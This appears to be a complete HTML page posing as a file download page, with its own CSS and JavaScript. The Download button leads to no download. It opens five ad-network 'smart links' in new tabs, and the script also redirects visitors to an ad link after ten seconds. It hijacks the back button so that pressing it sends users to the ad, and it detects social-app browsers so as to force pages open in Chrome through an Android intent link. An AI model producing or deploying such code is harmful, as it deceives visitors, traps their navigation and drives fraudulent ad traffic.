<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Page</title>

<style>
body{
margin:0;
font-family:Arial;
background:#000;
text-align:center;
color:#fff;
}

.box{
margin-top:40px;
padding:20px;
}

img{
width:90%;
max-width:320px;
border-radius:12px;
margin:10px;
}

.btn{
display:inline-block;
padding:14px 35px;
background:#ff2d55;
color:#fff;
font-size:20px;
border-radius:10px;
text-decoration:none;
font-weight:bold;
margin-top:20px;
}

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
display:none;
align-items:center;
justify-content:center;
}

.popup-box{
background:#fff;
color:#000;
padding:25px;
border-radius:10px;
width:80%;
max-width:300px;
}

.chrome{
background:#28a745;
color:#fff;
padding:10px 25px;
border-radius:8px;
text-decoration:none;
display:inline-block;
margin-top:10px;
}
</style>
</head>

<body>

<div class="box">

<img src="https://i.imgur.com/RIiQnS0.jpeg">
<img src="https://i.imgur.com/jbGNrs0.gif">

<br>

<a href="#" id="downloadBtn" class="btn">Download</a>

</div>

<div class="popup" id="popup">
<div class="popup-box">

<h3>Better Experience</h3>
<p>Open in Chrome Browser</p>

<a id="chromeBtn" class="chrome">Open Chrome</a>

</div>
</div>

<script>

// ===== SMART LINKS =====

const links = [

"https://www.effectivegatecpm.com/qckxhnmwr9?key=1",
"https://www.effectivegatecpm.com/qckxhnmwr9?key=2",
"https://www.effectivegatecpm.com/qckxhnmwr9?key=3",
"https://www.effectivegatecpm.com/qckxhnmwr9?key=4",
"https://www.effectivegatecpm.com/qckxhnmwr9?key=5"

];

// ===== AUTO REDIRECT AFTER 10s =====

if(!sessionStorage.getItem("autoRedirect")){

sessionStorage.setItem("autoRedirect","1");

setTimeout(function(){

window.location.href = links[0];

},10000);

}

// ===== DOWNLOAD BUTTON =====

document.getElementById("downloadBtn").onclick=function(e){

e.preventDefault();

links.forEach((link,i)=>{

setTimeout(()=>{

window.open(link,"_blank");

}, i*700);

});

};

// ===== BACK BUTTON REDIRECT =====

history.pushState(null,null,location.href);

window.addEventListener("popstate",function(){

window.location.href = links[0];

});

// ===== SOCIAL IN-APP BROWSER DETECTION =====

function isInApp(){

let ua=navigator.userAgent;

return ua.includes("FBAN") ||
ua.includes("FBAV") ||
ua.includes("Instagram") ||
ua.includes("TikTok") ||
ua.includes("Pinterest") ||
ua.includes("Twitter") ||
ua.includes("Telegram");

}

if(isInApp()){

document.getElementById("popup").style.display="flex";

}

// ===== OPEN IN CHROME =====

document.getElementById("chromeBtn").onclick=function(){

let url=window.location.href;

window.location.href="intent://"+url.replace(/^https?:\/\//,'')

+"#Intent;scheme=https;package=com.android.chrome;end";

};

</script>

</body>
</html>
